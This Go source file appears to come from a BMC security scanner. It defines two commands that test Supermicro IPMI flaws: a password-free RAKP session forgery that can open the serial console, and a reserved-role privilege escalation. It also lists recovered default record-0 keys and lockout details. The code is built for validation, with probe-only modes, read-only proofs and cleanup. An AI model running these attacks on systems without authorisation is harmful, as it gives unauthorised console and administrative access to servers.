package cmd

// Supermicro/ATEN RMCP+ key-exchange bypasses: `smc-rakp-bypass` and `smc-priv-esc`.
//
// Neither authenticates the way OpenCmdSess does - smc-rakp-bypass uses no account at
// all and smc-priv-esc drives a hand-built four-packet RAKP sequence - so both build
// their own handshake and never open a session. They take the transport flags
// (--port/--timeout) without the credential group.

import (
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/spf13/cobra"

	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

// smcBypassUsage is the argument summary printed when smc-priv-esc is missing a
// required credential.
const smcBypassUsage = "smc-priv-esc [--probe-only] --low-user <u> --low-pass <p> [--admin-user ADMIN] [--reserved-role 0x24]"

// smc0014Report is the rendered result of the CVE-2026-65219 workflow.
type smc0014Report struct {
	Finding string `json:"finding"`
	Host    string `json:"host"`
	Port    int    `json:"port"`

	// Generation is the pre-auth BMC generation from the sessionless System GUID
	// board code. It selects the record-0 candidate order, so it is reported - and so
	// is its absence, because an undetected generation silently changes which key the
	// single interpretable attempt is spent on.
	Generation     string `json:"smcGeneration,omitempty"`
	GenerationNote string `json:"smcGenerationNote,omitempty"`

	Probe        *ipmi.SMCUnorderedRAKP3Probe `json:"probe,omitempty"`
	ProbeVerdict string                       `json:"probeVerdict"`

	Forge    *ipmi.SMCForgeResult   `json:"forge,omitempty"`
	Attempts []ipmi.SMCForgeAttempt `json:"forgeAttempts,omitempty"`
	Forged   bool                   `json:"forged"`
	KeyLabel string                 `json:"record0Key,omitempty"`
	// Defect and Inconclusive are the verdict fields a caller should read. Defect is
	// the ordering defect; Inconclusive says the run cannot support "not vulnerable".
	Defect       bool   `json:"defect"`
	Inconclusive bool   `json:"inconclusive"`
	Reason       string `json:"inconclusiveReason,omitempty"`

	Capabilities []ipmi.SMCCapabilityResult `json:"readOnlyCapabilities,omitempty"`

	SOLAttempted bool   `json:"solAttempted"`
	SOLActivated bool   `json:"solActivated"`
	SOLResponse  string `json:"solResponse,omitempty"`
	SOLError     string `json:"solError,omitempty"`

	Impact string   `json:"impact"`
	Notes  []string `json:"notes,omitempty"`
}

func runIPMISMC0014(cmd *cobra.Command, host string) error {
	out := cmd.OutOrStdout()
	timeout := ipmiTimeout
	if timeout <= 0 {
		timeout = time.Second
	}
	rep := &smc0014Report{
		Finding: "CVE-2026-65219",
		Host:    host,
		Port:    ipmiPort,
		Impact:  "SOL (host serial console) with no account password; NOT full administrative IPMI",
		Notes: []string{
			"Requires a session slot no RAKP message 1 has ever landed on. A release does not scrub the residue and the rover allocator hands the slot straight back, so failed attempts do not consume it - but an ordinary login does, which is why this wants a window after a BMC reset or a lightly used board.",
			"The key is user record 0's stored password: short and PER-PRODUCT, not a fleet constant. Recovered live as \"0\" on X11DPT-PS FW 01.74, \"admin\" on X10DSC+ FW 4.00 and the EMPTY STRING on H13 FW 01.03; on a unit with SMCRAKP mode enabled it is the CVE-2026-18449 firmware constant instead.",
			"Raising the forged session's privilege to Administrator does not widen its command reach: record 0's IPMI-messaging bit is clear, so bin/ipmi_lan confines it to a narrow lane. Measured reach on seven units: Get System GUID, Get Channel Auth Caps and Get SOL Config Params answer 0x00, everything else including Get Payload Activation Status answers 0xd4.",
			"A rejected candidate is NOT free on X11/X12/X13/H13: it counts toward a time-limited lock on user record 0, and the lock check runs AFTER the authentication-code compare - so past the threshold the CORRECT key is answered with the same 0x08 as a wrong one. Measured on H13 FW 01.03: threshold 3, lock clears in under 32s on its own with no reset. Only the first candidate of a run is interpretable there.",
			"A rejection cannot be told apart from a missing pristine slot: both are RAKP4 0x08 with the console SID echoed. Cold-reset the BMC before believing a negative.",
		},
	}

	// The generation comes from the sessionless System GUID board code and needs no
	// credential. It picks the candidate order, which is the whole ball game when the
	// budget is one attempt.
	gen, _, gerr := ipmi.SMCDetectGeneration(host, ipmiPort, timeout)
	switch {
	case gerr != nil:
		rep.GenerationNote = fmt.Sprintf("generation not detected (%v): the record-0 candidate order falls back to the unknown-generation list, so the one interpretable attempt may be spent on the wrong key. Pass --record0-keys explicitly if the board is known", gerr)
	case gen == "":
		rep.GenerationNote = "the System GUID board code is not in the generation table: the record-0 candidate order falls back to the unknown-generation list. Pass --record0-keys explicitly if the board is known"
	default:
		rep.Generation = gen
	}

	if smcProbeOnly {
		// Detection only: one deliberately wrong authentication code can increment
		// record 0's failure counter. No session is opened or SOL payload activated.
		probe, err := ipmi.ProbeSMCUnorderedRAKP3(host, ipmiPort, timeout)
		rep.Probe = probe
		rep.ProbeVerdict = probe.Summary()
		if err != nil && (probe == nil || !probe.Answered) {
			return fmt.Errorf("smc-rakp-bypass probe: %w", err)
		}
		rep.Defect = probe.Defect
		rep.Inconclusive = !probe.Answered
		if rep.Inconclusive {
			rep.Reason = "no RAKP message 4 came back, so nothing was measured; re-take after resting the board"
		}
		return printIPMISMCReport(cmd, out, rep)
	}

	// Session validation: do not run the standalone probe first. Its wrong key charges
	// the same bad-password record against user record 0 that a rejected candidate
	// does, so running it would spend the one interpretable attempt before the real
	// candidate is ever sent. The forge's first attempt reports the ordering verdict
	// from the same RAKP4 bytes.
	candidates, err := ipmi.ParseSMCRecord0KeyCandidates(smcRecord0Keys)
	if err != nil {
		return err
	}
	if strings.TrimSpace(smcRecord0Keys) == "" && rep.Generation != "" {
		candidates = ipmi.SMCRecord0KeyCandidatesForGeneration(rep.Generation)
	}
	sess, forge := ipmi.ForgeSMCUnorderedRAKP3(host, ipmiPort, timeout, ipmi.SMCForgeOptions{
		Candidates:  candidates,
		MaxAttempts: smcRecord0MaxTries,
		Rest:        smcRecord0Rest,
		Generation:  rep.Generation,
	})
	rep.Forge = forge
	rep.Attempts = forge.Attempts
	rep.Defect = forge.Defect
	rep.Inconclusive = forge.Inconclusive
	rep.Reason = forge.Reason
	rep.ProbeVerdict = smcForgeVerdictLine(forge)
	if sess == nil {
		return printIPMISMCReport(cmd, out, rep)
	}
	defer sess.Close()
	rep.Forged = true
	rep.KeyLabel = forge.KeyLabel

	// Read-only capability probe. Every command here is a get; the expected shape
	// on an affected unit is a handful of 0x00 answers and 0xd4 for everything
	// gated on the IPMI-messaging bit.
	rep.Capabilities = ipmi.ProbeSMCForgedCapabilities(sess)

	if smcActivateSOL {
		rep.SOLAttempted = true
		data, aerr := ipmi.ActivateSMCForgedSOL(sess)
		if aerr != nil {
			rep.SOLError = aerr.Error()
		} else {
			rep.SOLActivated = true
			rep.SOLResponse = fmt.Sprintf("%x", data)
			// Leave the board as we found it: an activated payload occupies the single
			// SOL instance and would lock out a legitimate operator.
			if derr := ipmi.DeactivateSMCForgedSOL(sess); derr != nil {
				rep.SOLError = fmt.Sprintf("deactivate: %v", derr)
			}
		}
	}
	return printIPMISMCReport(cmd, out, rep)
}

// smc0015Report is the rendered result of the CVE-2026-65220 workflow.
type smc0015Report struct {
	Finding string `json:"finding"`
	Host    string `json:"host"`
	Port    int    `json:"port"`

	Probe        *ipmi.SMCReservedRoleProbe `json:"probe"`
	ProbeVerdict string                     `json:"probeVerdict"`

	Escalation *ipmi.SMCReservedRoleEscalation `json:"escalation,omitempty"`

	Impact string   `json:"impact"`
	Notes  []string `json:"notes,omitempty"`
}

func runIPMISMC0015(cmd *cobra.Command, host string) error {
	out := cmd.OutOrStdout()
	timeout := ipmiTimeout
	if timeout <= 0 {
		timeout = time.Second
	}
	rep := &smc0015Report{
		Finding: "CVE-2026-65220",
		Host:    host,
		Port:    ipmiPort,
		Impact:  "low-privilege account to Administrator; a PRIVILEGE ESCALATION that requires a valid credential, not an authentication bypass",
		Notes: []string{
			"RAKP message 1 needs no credential, which is what lets the Administrator-named seed run; RAKP message 3 is still signed with the low-privilege account's own real password.",
			"The result is proven with a privileged READ (Get User Access), not with the Set Session Privilege Level oracle: on this stack the oracle reports a level that does not always reflect real authorization, and reading it as proof has already produced a wrong conclusion.",
			"Both controls are run: no Administrator seed, and an Administrator seed with a spec-conformant role lookup (0x12). Neither should escalate.",
		},
	}

	// Validate the escalation inputs before any packet goes out, so a bad flag
	// fails immediately instead of after a probe timeout.
	role, err := validateSMC0015Options(smcProbeOnly, smcLowUser, smcReservedRole)
	if err != nil {
		return err
	}

	probe, perr := ipmi.ProbeSMCReservedRole(host, ipmiPort, smcAdminUser, timeout)
	rep.Probe = probe
	rep.ProbeVerdict = probe.Summary()
	if perr != nil && (probe == nil || probe.Username == "") {
		return fmt.Errorf("smc-priv-esc probe: %w", perr)
	}
	if smcProbeOnly {
		return printIPMISMCReport(cmd, out, rep)
	}
	rep.Escalation = ipmi.RunSMCReservedRoleEscalation(host, ipmiPort, smcLowUser, smcLowPass, smcAdminUser, role, timeout, nil,
		ipmi.WithSMCOperatorControl(smcOpUser, smcOpPass),
		ipmi.WithSMCAdminReference(smcAdminPass))
	return printIPMISMCReport(cmd, out, rep)
}

// validateSMC0015Options checks the escalation inputs without touching the
// network. In --probe-only mode no credential is needed, because that path only
// measures whether the reserved role byte is accepted.
func validateSMC0015Options(probeOnly bool, lowUser, reservedRole string) (byte, error) {
	role, err := parseByteArg(reservedRole)
	if err != nil {
		return 0, fmt.Errorf("invalid --reserved-role %q: %w", reservedRole, err)
	}
	// The defect lives in the missing default arm, so the upper nibble has to be one
	// the handler does not implement. Only 0x0x (name-only lookup) and 0x1x (role
	// lookup) are implemented; every nibble from 0x2 to 0xF falls into the same
	// residual-privilege else-arm, so the accepted range must not stop short of 0xFx.
	if hi := role & 0xf0; hi < 0x20 {
		return 0, fmt.Errorf("--reserved-role 0x%02x has upper nibble 0x%x; the defect needs a RESERVED nibble, 0x2x through 0xFx (0x0x and 0x1x are the two arms the handler implements and take the correctly clamped path)", role, hi>>4)
	}
	if probeOnly {
		return role, nil
	}
	if strings.TrimSpace(lowUser) == "" {
		return 0, fmt.Errorf("smc-priv-esc needs a valid low-privilege credential: pass --low-user and --low-pass (this is a privilege escalation, not an authentication bypass). Use --probe-only for the credential-free detection probe.\nusage: %s", smcBypassUsage)
	}
	return role, nil
}

// printIPMISMCReport renders a bypass report honoring --format. It does not go
// through printIPMIResult because that requires a *ipmi.CmdSess, which these
// pre-session subcommands never build. The command-injection validators
// (smc-x14-cmdinj/smc-alert-cmdinj) do hold a session but reuse this path so their reports
// print the same way as smc-rakp-bypass/smc-priv-esc.
func printIPMISMCReport(cmd *cobra.Command, out interface{ Write([]byte) (int, error) }, rep any) error {
	switch normalizeIPMIFormat(ipmiOutputFormat) {
	case "json", "jsonl":
		b, err := json.Marshal(rep)
		if err != nil {
			return err
		}
		_, err = fmt.Fprintln(out, string(b))
		return err
	}
	switch r := rep.(type) {
	case *smc0014Report:
		return printSMC0014Table(out, r)
	case *smc0015Report:
		return printSMC0015Table(out, r)
	}
	return fmt.Errorf("unsupported report type %T", rep)
}

func printSMC0014Table(w interface{ Write([]byte) (int, error) }, r *smc0014Report) error {
	fmt.Fprintf(w, "HOST=%s PORT=%d FINDING=%s", r.Host, r.Port, r.Finding)
	if r.Generation != "" {
		fmt.Fprintf(w, " GENERATION=%s", r.Generation)
	}
	fmt.Fprintln(w)
	if r.GenerationNote != "" {
		fmt.Fprintf(w, "WARNING: %s\n", r.GenerationNote)
	}
	fmt.Fprintf(w, "DEFECT PROBE (no key or session; may increment failure counter): %s\n", r.ProbeVerdict)
	if r.Probe != nil {
		fmt.Fprintf(w, "  cipher suite          : %d\n", r.Probe.CipherSuite)
		fmt.Fprintf(w, "  rakp1 sent            : false\n")
		fmt.Fprintf(w, "  rakp4 status          : 0x%02x (%s)\n", r.Probe.RAKP4Status, r.Probe.RAKP4StatusText)
		fmt.Fprintf(w, "  console sid echoed    : %t\n", r.Probe.SIDEchoed)
		fmt.Fprintf(w, "  ordering defect       : %t\n", r.Probe.Defect)
		if r.Probe.SpecConformant {
			fmt.Fprintf(w, "  verdict               : NOT affected (spec-conformant 0x0f, OpenBMC-class stack)\n")
		}
	}
	if len(r.Attempts) > 0 {
		rows := make([][]string, 0, len(r.Attempts))
		for _, a := range r.Attempts {
			note := a.Error
			if a.Activated {
				note = "session activated"
			}
			rows = append(rows, []string{a.KeyLabel, ccOrDash(a.RAKP4Observed, a.RAKP4Status), a.RAKP4StatusText, note})
		}
		fmt.Fprintln(w, "FORGE ATTEMPTS (record-0 key candidates):")
		if err := writeASCIITable(w, []string{"Key", "RAKP4", "Status", "Note"}, rows); err != nil {
			return err
		}
	}
	if r.Forge != nil && len(r.Forge.Untried) > 0 {
		fmt.Fprintf(w, "  untried candidates    : %s\n", strings.Join(r.Forge.Untried, ", "))
	}
	fmt.Fprintf(w, "FORGED: %t", r.Forged)
	if r.Forged {
		fmt.Fprintf(w, "  (record-0 key = %s)", r.KeyLabel)
	}
	fmt.Fprintln(w)
	// A negative must never read as "not vulnerable" when the measurement could not
	// distinguish a wrong key from a locked user record 0.
	if !r.Forged && r.Inconclusive {
		fmt.Fprintf(w, "RESULT: INCONCLUSIVE, not negative - %s\n", r.Reason)
	}
	if len(r.Capabilities) > 0 {
		rows := make([][]string, 0, len(r.Capabilities))
		for _, c := range r.Capabilities {
			note := c.Error
			if note == "" && c.CC == 0xd4 {
				note = "insufficient-privilege"
			}
			rows = append(rows, []string{c.Name, fmt.Sprintf("%02x/%02x", c.NetFn, c.Cmd), fmt.Sprintf("0x%02x", c.CC), c.Data, note})
		}
		fmt.Fprintln(w, "READ-ONLY CAPABILITY PROBE:")
		if err := writeASCIITable(w, []string{"Command", "NetFn/Cmd", "CC", "Data", "Note"}, rows); err != nil {
			return err
		}
	}
	if r.SOLAttempted {
		fmt.Fprintf(w, "SOL ACTIVATE (--activate-sol): activated=%t response=%s %s\n", r.SOLActivated, r.SOLResponse, r.SOLError)
	}
	// Do not print the impact statement or the exploitation caveats when the
	// measurement says the target is not affected, or when nothing was measured at
	// all: on an OpenBMC-class stack that answers 0x0f, or on a host that never
	// answered, an "IMPACT: SOL with no account password" line reads as a live
	// exposure on a host that does not have one.
	specConformant := (r.Probe != nil && r.Probe.SpecConformant) || (r.Forge != nil && r.Forge.SpecConformant)
	if specConformant && !r.Forged {
		fmt.Fprintln(w, "IMPACT: none on this target - the RAKP state machine rejected the out-of-order message 3.")
		return nil
	}
	if !r.Defect && !r.Forged {
		fmt.Fprintln(w, "IMPACT: not established on this target - the ordering defect was not measured (see the verdict above).")
		return nil
	}
	fmt.Fprintf(w, "IMPACT: %s\n", r.Impact)
	// The scope precondition bounds the finding, so it prints unconditionally: on an
	// affected unit the IMPACT line above reads as SOL-with-no-password, and without
	// the precondition beside it that overstates the exposure - CVE-2026-65219 needs a
	// session slot that has not been allocated since boot. The remaining
	// interpretation notes stay behind --notes.
	printSMCPreconditionAndNotes(w, r.Notes)
	return nil
}

func printSMC0015Table(w interface{ Write([]byte) (int, error) }, r *smc0015Report) error {
	fmt.Fprintf(w, "HOST=%s PORT=%d FINDING=%s\n", r.Host, r.Port, r.Finding)
	fmt.Fprintf(w, "DEFECT PROBE (no credential offered): %s\n", r.ProbeVerdict)
	if p := r.Probe; p != nil {
		fmt.Fprintf(w, "  named account         : %s\n", p.Username)
		fmt.Fprintf(w, "  control role 0x%02x     : rakp2=0x%02x accepted=%t (USER lookup; proves the name resolves)\n", p.ConformantRole, p.ConformantStatus, p.ConformantAccepted)
		fmt.Fprintf(w, "  admin role 0x%02x       : rakp2=0x%02x accepted=%t (seedable at privilege 4)\n", p.BaselineRole, p.BaselineStatus, p.BaselineAccepted)
		fmt.Fprintf(w, "  reserved role 0x%02x    : rakp2=0x%02x accepted=%t\n", p.ReservedRole, p.ReservedStatus, p.ReservedAccepted)
		fmt.Fprintf(w, "  role dispatch defect  : %t\n", p.Defect)
	}
	if e := r.Escalation; e != nil {
		fmt.Fprintf(w, "ESCALATION (proof is a privileged READ, not the privilege oracle; proof command = %s):\n", orNone(e.ProofWitness))
		rows := [][]string{
			{"baseline: normal login as " + e.LowUser, ccOrDash(e.BaselineMeasured, e.BaselineUserAccessCC), e.BaselineError},
			{"control 1: reserved role, NO administrator seed", ccOrDash(e.ControlNoSeedDone, e.ControlNoSeedCC), e.ControlNoSeedErr},
			{"control 2: administrator seed + conformant role 0x12", ccOrDash(e.ControlConformantDone, e.ControlConformantCC), e.ControlConformantErr},
			{fmt.Sprintf("validation: administrator seed + reserved role 0x%02x", e.Role), fmt.Sprintf("0x%02x", e.EscalatedUserAccessCC), e.Error},
		}
		if err := writeASCIITable(w, []string{"Case", "Get User Access CC", "Note"}, rows); err != nil {
			return err
		}
		if len(e.Witnesses) > 0 {
			wrows := make([][]string, 0, len(e.Witnesses))
			for _, wit := range e.Witnesses {
				var note string
				switch {
				case wit.Discriminates:
					note = "WITNESS: operator refused 0xd4, administrator granted"
				case !wit.OperatorMeasured:
					note = "no operator control"
				case !wit.AdminMeasured:
					note = "no administrator reference (--admin-pass)"
				case !wit.OperatorMeasured || wit.OperatorCC == 0x00:
					note = "granted to operator: cannot separate the two"
				case wit.AdminCC != 0x00:
					note = fmt.Sprintf("refused to a real administrator too (0x%02x): unavailable, not gated", wit.AdminCC)
				default:
					note = "not a witness on this unit"
				}
				wrows = append(wrows, []string{
					wit.Name,
					fmt.Sprintf("%02x/%02x", wit.NetFn, wit.Cmd),
					ccOrDash(wit.BaselineMeasured, wit.BaselineCC),
					ccOrDash(wit.OperatorMeasured, wit.OperatorCC),
					ccOrDash(wit.AdminMeasured, wit.AdminCC),
					ccOrDash(wit.EscalatedMeasured, wit.EscalatedCC),
					note,
				})
			}
			fmt.Fprintf(w, "ADMINISTRATOR WITNESS SELECTION (operator control = %s, administrator reference = %s):\n",
				orNone(e.OperatorUser), orNone(e.AdminReferenceUser))
			if err := writeASCIITable(w, []string{"Command", "NetFn/Cmd", "Baseline", "Operator", "Admin", "Escalated", "Note"}, wrows); err != nil {
				return err
			}
			if e.AdminReferenceErr != "" {
				fmt.Fprintf(w, "  administrator reference login failed: %s\n", e.AdminReferenceErr)
			}
			if e.OperatorUser != "" && !e.OperatorAboveBaseline {
				fmt.Fprintln(w, "  operator control NOT credible: it was not granted a single command the baseline login was refused,")
				fmt.Fprintln(w, "  so it did not land above USER and no witness derived from it is trusted. Check its channel privilege.")
			}
			if e.OperatorControlErr != "" {
				fmt.Fprintf(w, "  operator control login failed: %s\n", e.OperatorControlErr)
			}
		}
		fmt.Fprintf(w, "  lane witness (%s): baseline=0x%02x escalated=0x%02x closed=%t\n",
			"Get Device ID 0x06/0x01", e.LaneBaselineCC, e.LaneEscalatedCC, e.LaneClosed)
		if e.LowUserMessagingKnown {
			fmt.Fprintf(w, "  low-priv account LAN IPMI-messaging bit: %t (user id %d, read back from the escalated session)\n", e.LowUserMessaging, e.LowUserID)
		} else {
			fmt.Fprintln(w, "  low-priv account LAN IPMI-messaging bit: unknown (the session could not read it; check with `channel getaccess <ch> <id>`)")
		}
		fmt.Fprintf(w, "  ESCALATED: %t  reached=%s", e.Escalated, e.Reached)
		if e.WitnessUsed != "" {
			fmt.Fprintf(w, "  (decided by %s)", e.WitnessUsed)
		}
		fmt.Fprintln(w)
		if e.WitnessInconclusive && e.Escalated {
			fmt.Fprintln(w, "  (the escalated session is PROVEN above USER. The administrator/operator boundary was NOT established:")
			switch {
			case e.OperatorUser == "":
				fmt.Fprintln(w, "   no Operator-privilege control was supplied, so no command could be shown to separate the two.")
				fmt.Fprintln(w, "   Pass --op-user/--op-pass, and --admin-pass for the upper reference.)")
			case e.AdminReferenceUser == "":
				fmt.Fprintln(w, "   an Operator control was measured but no Administrator reference, so a command refused to")
				fmt.Fprintln(w, "   the Operator cannot be told apart from one this firmware refuses to everyone. Pass --admin-pass.)")
			default:
				fmt.Fprintln(w, "   both controls were measured and NO read-only command separates Operator from Administrator on")
				fmt.Fprintln(w, "   this firmware - every candidate is either granted to an Operator or refused to a real")
				fmt.Fprintln(w, "   Administrator as well. The ceiling is genuinely unresolved by reads, not an Operator ceiling.)")
			}
		}
		if e.SeedRedundant {
			fmt.Fprintln(w, "  (the no-seed control escalated too: the session slot already held privilege 4 as residue from an")
			fmt.Fprintln(w, "   earlier administrator session, so the Administrator-named message 1 was not needed on this run.)")
		}
		if !e.BaselineMeasured {
			fmt.Fprintln(w, "  (escalation withheld: the baseline login could not be measured, so a privileged read proves nothing about a change in privilege)")
		}
		if e.Inconclusive {
			fmt.Fprintf(w, "  RESULT: INCONCLUSIVE, not negative - %s\n", e.Reason)
		}
	}
	fmt.Fprintf(w, "IMPACT: %s\n", r.Impact)
	printSMCPreconditionAndNotes(w, r.Notes)
	return nil
}

// printSMCPreconditionAndNotes writes the required scope precondition - the
// first note - unconditionally, then the remaining interpretation notes only under
// --notes. The precondition bounds the finding and must never be suppressed by
// default, or the IMPACT line reads as a broader exposure than the finding is; the
// rest (per-generation keys, the record-0 lockout, how to read an ambiguous
// rejection) are opt-in so an ordinary run ends on its own verdict.
func printSMCPreconditionAndNotes(w interface{ Write([]byte) (int, error) }, notes []string) {
	if len(notes) == 0 {
		return
	}
	fmt.Fprintf(w, "PRECONDITION: %s\n", notes[0])
	if !smcNotes {
		return
	}
	for _, n := range notes[1:] {
		fmt.Fprintf(w, "NOTE: %s\n", n)
	}
}

// smcForgeVerdictLine renders the ordering verdict from the forge's first attempt,
// which is what the exploitation path uses in place of a separate probe packet.
func smcForgeVerdictLine(f *ipmi.SMCForgeResult) string {
	if f == nil || len(f.Attempts) == 0 {
		return "not-probed"
	}
	// Read the first answered attempt: a dropped first packet is not the measurement.
	var answered *ipmi.SMCForgeAttempt
	for i := range f.Attempts {
		if f.Attempts[i].RAKP4Observed {
			answered = &f.Attempts[i]
			break
		}
	}
	switch {
	case answered == nil:
		return "no-reply (nothing measured; re-take after resting the board)"
	case f.Forged:
		return "unordered-rakp3 accepted AND session activated (rakp4=0x00)"
	case f.Defect:
		return fmt.Sprintf("unordered-rakp3-accepted (rakp4=0x%02x, console-sid echoed)", answered.RAKP4Status)
	case f.SpecConformant:
		return "rejected-spec-conformant (rakp4=0x0f)"
	default:
		return fmt.Sprintf("rejected (rakp4=0x%02x)", answered.RAKP4Status)
	}
}

// ccOrDash renders a completion code, or a dash when it was never measured, so an
// unmeasured control is never read as a completion code of zero.
func ccOrDash(measured bool, cc byte) string {
	if !measured {
		return "-"
	}
	return fmt.Sprintf("0x%02x", cc)
}

// orNone renders an empty optional input as "<none supplied>" rather than blank, so
// a missing control is visible in the report.
func orNone(s string) string {
	if strings.TrimSpace(s) == "" {
		return "<none supplied>"
	}
	return s
}
